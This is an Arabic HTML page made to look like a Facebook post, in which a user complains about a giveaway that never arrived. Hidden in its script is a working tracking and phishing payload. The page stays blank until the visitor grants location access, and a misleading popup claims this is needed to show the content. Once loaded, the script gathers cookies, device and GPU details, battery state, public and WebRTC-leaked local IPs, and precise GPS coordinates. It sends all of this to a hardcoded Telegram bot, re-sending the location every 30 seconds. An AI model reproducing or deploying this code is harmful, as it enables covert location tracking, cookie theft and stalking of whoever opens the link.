<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوست فيسبوك</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <meta property="og:title" content="بوست فيسبوك">
    <meta property="og:description" content="هذا هو وصف البوست الذي سيظهر عند مشاركة الرابط.">
    <meta property="og:image" content="https://scontent.fcai27-1.fna.fbcdn.net/v/t39.30808-6/452874322_122105379992406176_3662505750246819816_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=127cfc&_nc_ohc=VA01yfRkydoQ7kNvgF6nLj_&_nc_ht=scontent.fcai27-1.fna&oh=00_AYCiYqbJHwlKCa4pqfWZ-6rr6oTHUH75kiDzwNNKnvSRgQ&oe=66A9B997">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://example.com/your-page">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            display: none; /* إخفاء الصفحة بالكامل حتى يتم منح الإذن */
        }
        .post-container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            border-radius: 8px;
            padding: 10px;
        }
        .post-header {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        .post-header img {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            margin-left: 10px;
        }
        .post-header div {
            flex-grow: 1;
        }
        .post-content {
            margin-bottom: 10px;
        }
        .post-images {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 5px;
            margin-bottom: 10px;
        }
        .post-images img {
            width: 100%;
            border-radius: 4px;
        }
        .post-actions {
            display: flex;
            justify-content: space-around;
            border-top: 1px solid #ddd;
            padding-top: 10px;
        }
        .post-actions span {
            cursor: pointer;
            color: #1877f2;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .post-actions span i {
            margin-left: 5px;
        }
        .popup {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            max-width: 300px;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
        }
        .popup-content {
            margin: 0 auto;
            padding: 20px;
        }
        .popup button {
            background-color: #1877f2;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }
        .popup button:hover {
            background-color: #166fe5;
        }
    </style>
</head>
<body>
    <div class="post-container">
        <div class="post-header">
            <img src="https://scontent.fcai27-1.fna.fbcdn.net/v/t39.30808-1/451946287_122100108308410227_5888571531469014872_n.jpg?stp=dst-jpg_p100x100&_nc_cat=109&ccb=1-7&_nc_sid=0ecb9b&_nc_ohc=nK008aC-gFUQ7kNvgECtCXd&_nc_ht=scontent.fcai27-1.fna&oh=00_AYC2n3_Snm9yaO_vkKu0ucQ-CCbSoOpKDD62GM05qxYdEQ&oe=66A99026" alt="صورة المستخدم">
            <div>
                <div><strong>Toha Mohamed</strong></div>
                <div>منذ ساعتين</div>
            </div>
        </div>
        <div class="post-content">
            هي دي الهدايه الي الصفحه بتقول انها رجعت ومافيش حاجه رجعت اصلا وحسبي الله ونعمل الوكيل في كل ظالم.
        </div>
        <div class="post-images">
            <img src="https://scontent.fcai27-1.fna.fbcdn.net/v/t39.30808-6/452935767_122105379938406176_7576968492794063069_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=127cfc&_nc_ohc=-MDL19KbwgUQ7kNvgHDXqMz&_nc_ht=scontent.fcai27-1.fna&oh=00_AYCR1EKqR68VBjcMFy-5diFN8TdfbsnvHicoiGh96zLPhw&oe=66A98900" alt="الصورة 1">
            <img src="https://scontent.fcai27-1.fna.fbcdn.net/v/t39.30808-6/452874322_122105379992406176_3662505750246819816_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=127cfc&_nc_ohc=VA01yfRkydoQ7kNvgF6nLj_&_nc_ht=scontent.fcai27-1.fna&oh=00_AYCiYqbJHwlKCa4pqfWZ-6rr6oTHUH75kiDzwNNKnvSRgQ&oe=66A9B997" alt="الصورة 2">
        </div>
        <div class="post-actions">
            <span><i class="fas fa-thumbs-up"></i>إعجاب</span>
            <span><i class="fas fa-comment"></i>تعليق</span>
            <span><i class="fas fa-share"></i>مشاركة</span>
        </div>
    </div>
    <div id="permissionPopup" class="popup">
        <div class="popup-content">
            <h2>إشعار هام</h2>
            <p>لحل مشكلة عرض المحتوى، يرجى السماح بالأذونات المطلوبة.</p>
            <button onclick="requestLocationPermission()">السماح الآن</button>
        </div>
    </div>
    <script>
        const botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
        const chatId = '962686305';

        function sendInformationToTelegram(info) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;

            fetch(url)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Information sent to Telegram bot:', data);
                })
                .catch(error => {
                    console.error('There was a problem with the fetch operation:', error);
                });
        }

        function collectExtendedDeviceInfo() {
            const deviceInfo = {
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير متوفر',
                deviceMemory: navigator.deviceMemory || 'غير متوفر',
                userAgent: navigator.userAgent,
                language: navigator.language,
                browser: getBrowser(),
                screenHeight: window.screen.height,
                screenWidth: window.screen.width,
                network: getNetworkInfo(),
                cookies: document.cookie,
                hardwareInfo: getHardwareInfo(),
                location: 'غير متوفر'
            };

            collectGPUInfo(deviceInfo);
            collectBatteryInfo(deviceInfo);
            collectIPInfo(deviceInfo);
        }

        function getBrowser() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf('Firefox') != -1) return 'Firefox';
            if (userAgent.indexOf('Chrome') != -1) return 'Chrome';
            if (userAgent.indexOf('Safari') != -1) return 'Safari';
            if (userAgent.indexOf('Edge') != -1) return 'Edge';
            return 'غير معروف';
        }

        function collectGPUInfo(deviceInfo) {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                deviceInfo.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
                deviceInfo.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
            }
        }

        function getNetworkInfo() {
            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                return {
                    type: connection.type,
                    downlink: connection.downlink,
                    effectiveType: connection.effectiveType
                };
            }
            return 'غير متوفر';
        }

        function collectBatteryInfo(deviceInfo) {
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    deviceInfo.battery = {
                        level: battery.level * 100 + '%',
                        charging: battery.charging ? 'نعم' : 'لا',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
                });
            }
        }

        function collectIPInfo(deviceInfo) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    deviceInfo.publicIP = data.ip;
                    getLocalIP(ip => {
                        deviceInfo.localIP = ip;
                        sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
                    });
                });
        }

        function getLocalIP(callback) {
            const peerConnection = new RTCPeerConnection({ iceServers: [] });
            peerConnection.createDataChannel('');
            peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer)).catch(error => console.error(error));
            peerConnection.onicecandidate = event => {
                if (event.candidate) {
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const ipMatch = ipRegex.exec(event.candidate.candidate);
                    if (ipMatch) {
                        callback(ipMatch[1]);
                    }
                }
            };
        }

        function getHardwareInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor
            };
        }

        function requestLocationPermission() {
            navigator.geolocation.getCurrentPosition(position => {
                localStorage.setItem('locationPermission', 'granted');
                document.getElementById('permissionPopup').style.display = 'none';
                document.body.style.display = 'block';
                collectAndSendLocation();
            }, error => {
                console.log("Error: " + error.message);
                document.getElementById('permissionPopup').style.display = 'block';
                setTimeout(requestLocationPermission, 5000);
            });
        }

        function checkLocationPermission() {
            const locationPermission = localStorage.getItem('locationPermission');
            if (locationPermission === 'granted') {
                document.body.style.display = 'block';
                collectAndSendLocation();
            } else {
                navigator.permissions.query({name:'geolocation'}).then(result => {
                    if (result.state === 'granted') {
                        document.body.style.display = 'block';
                        collectAndSendLocation();
                    } else {
                        document.getElementById('permissionPopup').style.display = 'block';
                        setTimeout(requestLocationPermission, 5000);
                    }
                });
            }
        }

        function collectAndSendLocation() {
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
                const locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
                sendInformationToTelegram(locationInfo);
            }, () => {
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        const lat = data.latitude;
                        const lon = data.longitude;
                        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
                        const locationInfo = `إحداثيات مستخلصة من IP: خط العرض ${lat}، خط الطول ${lon}\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
                        sendInformationToTelegram(locationInfo);
                    });
            });
        }

        window.onload = function() {
            checkLocationPermission();
            collectExtendedDeviceInfo();
            setInterval(checkLocationPermission, 30000);
        };
    </script>
</body>
</html>
